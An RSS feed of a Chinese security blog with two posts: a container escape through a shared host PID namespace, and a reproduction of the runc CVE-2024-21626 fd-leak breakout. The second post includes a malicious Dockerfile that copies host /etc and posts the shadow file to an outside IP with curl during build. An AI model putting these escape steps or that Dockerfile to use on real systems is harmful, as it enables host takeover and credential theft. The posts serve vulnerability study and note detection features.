<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>escape on AmiaaaZ's Site</title><link>https://amiaaaz.github.io/tags/escape/</link><description>Recent content in escape on AmiaaaZ's Site</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 24 Mar 2024 23:52:57 +0800</lastBuildDate><atom:link href="https://amiaaaz.github.io/tags/escape/index.xml" rel="self" type="application/rss+xml"/><item><title>共享宿主机PID namespace与容器逃逸</title><link>https://amiaaaz.github.io/2024/03/24/pid-namespace-share-and-escape/</link><pubDate>Sun, 24 Mar 2024 23:52:57 +0800</pubDate><guid>https://amiaaaz.github.io/2024/03/24/pid-namespace-share-and-escape/</guid><description>&lt;h2 id="前提">前提&lt;/h2>
&lt;ul>
&lt;li>容器共享宿主机PID name space（非常苛刻 这属于docker默认开启的安全措施）&lt;/li>
&lt;li>以uid为0运行&lt;/li>
&lt;li>没有启用user namespace（默认就不启用）&lt;/li>
&lt;li>没有添加额外的capbilities&lt;/li>
&lt;/ul>
&lt;p>可以利用某些进程的&lt;code>/proc/[pid]/root&lt;/code>实现逃逸&lt;/p>
&lt;p>理想docker启动命令：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run --rm -it --pid&lt;span style="color:#f92672">=&lt;/span>host --security-opt&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">apparmor&lt;/span>&lt;span style="color:#f92672">=&lt;/span>unconfined ubuntu bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="procpidroot">/proc/[pid]/root&lt;/h2>
&lt;p>根据proc(5)介绍，通过该符号链接可以访问任意进程的rootfs，如论当前进程和目标进程是否属于同一mount namespace，而调用/访问该符号链接需要经过ptrace(2)的权限检查&lt;/p>
&lt;p>根据手册，ptrace access mode checking会基于两进程的credentials和capabilities进行检查，其中的&lt;code>PTRACE_MODE_READ&lt;/code>就是针对符号链接的访问&lt;/p>
&lt;p>那具体这个check会如何进行呢？相关函数调用关系如下&lt;/p>
&lt;pre tabindex="0">&lt;code>/proc/[pid]/root
-&amp;gt; proc_pid_get_link() # 获取链接的实际路径
-&amp;gt; proc_fd_access_allowed() # 检查权限 通过符号链接的inode拿到进程的task_struct实例
-&amp;gt; ptrace_may_access() # 检查权限 调用该函数时第二个参数为PTRACE_MODE_READ_FSCREDS
-&amp;gt; security_ptrace_access_check()
-&amp;gt; cap_ptrace_access_check()
&lt;/code>&lt;/pre>&lt;p>在ptrace_may_access中完全允许同一线程组进行访问&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218210450630.png" alt="image-20240218210450630">&lt;/p>
&lt;p>因为有标志位，需要检查当前进程和目标进程的fsuid和fsgid是否一致，如果不一致就会调用ptrace_has_cap()检查当前进程在目标进程的name userspace中是否拥有CAP_SYS_PTRACE权限，如果没有则拒绝访问&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218212029516.png" alt="image-20240218212029516">&lt;/p>
&lt;p>如果以上都顺利则跳转ok部分，当目标进程被设置为nondumpable且当前进程在目标进程的user namespace中没有CAP_SYS_PTRACE权限时拒绝访问&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218212344103.png" alt="image-20240218212344103">&lt;/p>
&lt;p>最后调用security_ptrace_access_check()进行最终检查（和LSM有关 略过yama等的实现），对于commcap, security_ptrace_access_check()最终调用的时/security/commcap.c文件中的cap_ptrace_access_check()函数&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218212714427.png" alt="image-20240218212714427">&lt;/p>
&lt;p>根据是否设置标志位来决定使用effective capbility set有效能力集还是permitted capbility set许可能力集执行权限检查，接着如果两进程属于同一user namespace 且目标进程的许可能力集是当前进程能力集的子集，则通过检查，否则接着检查当前进程在目标进程所在的user namespace中是否拥有CAP_SYS_PTRACE能力，有则通过&lt;/p>
&lt;p>在默认配置下所有容器拥有相同的能力集，所以共享了宿主机PID namespace的容器能够访问其它容器进程的rootfs&lt;/p>
&lt;p>无法访问宿主机上以非root用户运行进程的rootfs，是因为当前进程/调用进程的fsuid, fsgid分别与目标进程的euid, suid, uid, egid, sgid, gid不匹配；无法访问宿主机上以root用户运行进程的rootfs，是因为能力集的问题（非子集）&lt;/p>
&lt;h2 id="利用思路">利用思路&lt;/h2>
&lt;p>根据以上研究，我们可以有这样的结论&lt;/p>
&lt;ul>
&lt;li>调用进程和目标进程属于统一个进程组，允许访问&lt;/li>
&lt;li>如果访问模式中指定PTRACE_MODE_FSCREDS标志位，则在接下来检查调用进程的filesystem UID(fsuid)和filesystem GID(fsgid)，如果指定PTRACE_MODE_REALCREDS标志位，则检查real UID(uid)和real GID(gid)&lt;/li>
&lt;li>调用进程的fsuid, fsgid需要分别与目标进程的euid, suid, uid, egid, sgid, gid匹配&lt;/li>
&lt;li>调用进程在目标进程的user namespace中需要拥有CAP_SYS_PTRACE能力&lt;/li>
&lt;li>如果目标进程被设置为nondumpable，且调用进程在目标进程的user namespace中没有CAP_SYS_PTRACE能力，那么拒绝访问&lt;/li>
&lt;li>如果不能满足以下任意一个条件，那么内核的commcap LSM模块会拒绝访问：
&lt;ul>
&lt;li>调用进程和目标进程属于同一个user namespace，且调用进程的能力集是目标进程的许可能力集的超集&lt;/li>
&lt;li>调用进程在目标进程所在的user namespace中拥有CAP_SYS_PTRACE能力&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>所以可以如何逃逸？我是没想出来，Nitro师傅：&lt;/p>
&lt;ul>
&lt;li>解决fsuid等不匹配：通过PID namespace共享找到宿主机上以非root用户运行的进程，我们在容器中创建一个uid和gid都与目标进程uid gid相同的用户，再在容器中su切换，就有权限访问目标进程的/proc/[pid]/root了，这个目标进程必须是dumpable的&lt;/li>
&lt;/ul>
&lt;p>非常好理解，但是也非常苛刻：我们怎么知道目标进程的uid和gid呢？&lt;/p>
&lt;h2 id="实操">实操&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run --rm -it --pid host ubuntu
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样flag下运行的docker，可以显示和宿主机一样的进程列表&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218215359045.png" alt="image-20240218215359045">&lt;/p>
&lt;p>在其中我们可以找到以普通权限运行的进程&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ps -a -o pid,ppid,user,group,args
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218215825070.png" alt="image-20240218215825070">&lt;/p>
&lt;p>我们创建对应用户&lt;/p>
&lt;pre tabindex="0">&lt;code>useradd -m -u 1000 -U nise
su nise
&lt;/code>&lt;/pre>&lt;p>但是却没办法做到&lt;code>ls -l /proc/[pid]/root/&lt;/code>，permission denied&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218223210267.png" alt="image-20240218223210267">&lt;/p>
&lt;p>看了一下以这个为原型的RWCTF 2024的题，原来docker flag还需要加上这个flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run --rm -it --pid&lt;span style="color:#f92672">=&lt;/span>host --security-opt&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">apparmor&lt;/span>&lt;span style="color:#f92672">=&lt;/span>unconfined ubuntu bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240218223813997.png" alt="image-20240218223813997">&lt;/p>
&lt;p>即&lt;code>--security-opt=apparmor=unconfined&lt;/code>选项同时开启的情况下，可以完成逃逸&lt;/p>
&lt;p>简便措施：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> fd in &lt;span style="color:#d88200">`&lt;/span>find /proc/*/root&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">do&lt;/span> ls -al &lt;span style="color:#111">$fd&lt;/span> &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#8045ff">\&amp;gt;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">done&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接找哪些进程的root能打开&lt;/p>
&lt;hr>
&lt;p>anyway, but&lt;/p>
&lt;p>和进程安全有关的选项，如果谁脑子想不开了用这个flag，想必它的主机也不安全&lt;/p>
&lt;p>参考文章：&lt;/p>
&lt;p>&lt;a href="https://www.anquanke.com/post/id/290540">一个未公开的容器逃逸方式&lt;/a>&lt;/p>
&lt;p>RWCTF 2024 出题思路&amp;amp;wp: &lt;a href="https://github.com/WinMin/Be-a-Docker-Escaper/blob/main/Be-a-Docker-Escaper-4/README.md">https://github.com/WinMin/Be-a-Docker-Escaper/blob/main/Be-a-Docker-Escaper-4/README.md&lt;/a>&lt;/p></description></item><item><title>CVE-2024-21626复现</title><link>https://amiaaaz.github.io/2024/03/24/cve-2024-21626/</link><pubDate>Sun, 24 Mar 2024 23:48:23 +0800</pubDate><guid>https://amiaaaz.github.io/2024/03/24/cve-2024-21626/</guid><description>&lt;p>公告：&lt;a href="https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv">several container breakouts due to internally leaked fds&lt;/a>&lt;/p>
&lt;p>影响范围：runc &amp;gt;=v1.0.0-rc93,&amp;lt;=1.1.11&lt;/p>
&lt;p>额外要求：linux内核版本大于5.6 (uname -r)&lt;/p>
&lt;p>检查方式&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213163353866.png" alt="image-20240213163353866">&lt;/p>
&lt;h2 id="runc">runc&lt;/h2>
&lt;p>docker中的默认runtime是runc，它是基于OCI specification编写的一个容器底层运行时，可以手动替换为安全性更高、隔离性更强的gvisor(runc)，也是基于OCI规范 可以无缝切换&lt;/p>
&lt;p>作为底层工具，当runc出现问题会影响docker和k8s&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>&lt;code>prepareOpenat2&lt;/code>函数会检查&lt;code>openat2&lt;/code>这个syscall能否被正常调用，若失败 进入到&lt;code>openFallback&lt;/code>，若成功 则用&lt;code>unix.Openat2&lt;/code>系统调用打开&lt;code>/sys/fs/cgroup&lt;/code>，这里的&lt;code>unix.Openat2&lt;/code>是有&lt;code>O_CLOEXEC&lt;/code>flag的&lt;/p>
&lt;p>如果成功打开&lt;code>/sys/fs/cgroup&lt;/code>，必然有一个fd指向该文件夹，但&lt;code>prepareOpenat2&lt;/code>函数执行完之后并没有把这个fd正常关闭 也没有返回 导致泄露&lt;/p>
&lt;p>利用思路：runc创建子进程时 &amp;amp;&amp;amp; exec/run即将执行的二进制文件还没关闭之前，将process.cwd设置为&lt;code>/proc/self/fd/7&lt;/code>，此时这个二进制进程的&lt;code>/proc/[pid]/cwd&lt;/code>就会指向容器外的&lt;code>/sys/fs/cgroup&lt;/code>，之后的子进程就可以利用该fd的&lt;code>/proc/self/fd/[fdnum]&lt;/code>来访问宿主机的文件系统&lt;/p>
&lt;p>至于最初为什么要检查&lt;code>openat2&lt;/code>，是因为&lt;code>openat(2)&lt;/code>可以避免在容器的mount命名空间中挂载宿主机文件系统的目录时存在逃逸的风险，但最终又引入了新的问题&lt;/p>
&lt;h2 id="复现">复现&lt;/h2>
&lt;p>可以不使用完整docker 直接复现runc漏洞&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将基本镜像导出rootfs&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run --name helper-ctr alpine
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#111">export&lt;/span> helper-ctr --output alpine.tar
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir rootfs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tar xf alpine.tar -C rootfs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 使用runc命令创建默认配置文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>runc spec
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 修改运行时指定的cwd&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -ri &lt;span style="color:#d88200">&amp;#39;s#(\s*&amp;#34;cwd&amp;#34;: )&amp;#34;(/)&amp;#34;#\1 &amp;#34;/proc/self/fd/7&amp;#34;#g&amp;#39;&lt;/span> config.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>grep cwd config.json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># exploit&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo runc --log ./log.json run demo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213174402355.png" alt="image-20240213174402355">&lt;/p>
&lt;p>注意到我们把cwd指定为&lt;code>/proc/self/fd/7&lt;/code>，这个数字和golang运行时有关&lt;/p>
&lt;p>0, 1, 2分别是标准输入 标准输出和标准错误，3是日志文件，golang程序刚启动时会创建一个epoll文件描述符4和一个管道(5, 6)，接着初始化cgroup管理模块时打开&lt;code>/sys/fs/cgroup&lt;/code>目录7&lt;/p>
&lt;p>但在使用docker run创建的容器中 &lt;code>/sys/fs/cgroup&lt;/code>的文件描述符是8，但有时也是7（详细原因暂略 看不懂）&lt;/p>
&lt;p>另外一个细节是&lt;code>--log&lt;/code>，如果不指定log参数 &lt;code>/sys/fs/cgroup&lt;/code>目录的文件描述符就会是3，无法利用（原因略 看不懂）&lt;/p>
&lt;h2 id="利用">利用&lt;/h2>
&lt;p>利用过程中的几条特征&lt;/p>
&lt;ul>
&lt;li>在容器中产生cwd 形如&lt;code>/proc/self/fd/[fd]&lt;/code>的进程&lt;/li>
&lt;li>在容器中产生目标目录为&lt;code>/proc/self/fd/[fd]&lt;/code>的&lt;code>symlink(2)&lt;/code>或&lt;code>symlinkat(2)&lt;/code>的系统调用&lt;/li>
&lt;li>在容器中产生open/openat/openat2系统调用，且文件名有&lt;code>/proc/\d+/cwd/.*&lt;/code> 的正则表达式特征&lt;/li>
&lt;/ul>
&lt;p>利用场景（主要针对云服务）：&lt;/p>
&lt;ul>
&lt;li>制作恶意镜像 投毒公共库&lt;/li>
&lt;li>CI/CD平台控制work dir 导致漏洞&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>FROM ubuntu:latest
WORKDIR /proc/self/fd/7
RUN cp -r ../../../../../etc /hostetc
WORKDIR /
RUN apt update &amp;amp;&amp;amp; apt-get install -y --no-install-recommends curl ca-certificates
RUN curl -XPOST --data-binary @/hostetc/shadow http://165.154.148.13:10399/
&lt;/code>&lt;/pre>&lt;p>以上恶意镜像 在build阶段就可以把敏感文件带出 无需实际运行&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213212602227.png" alt="image-20240213212602227">&lt;/p>
&lt;p>参考文章：https://github.com/NitroCao/CVE-2024-21626&lt;/p></description></item></channel></rss>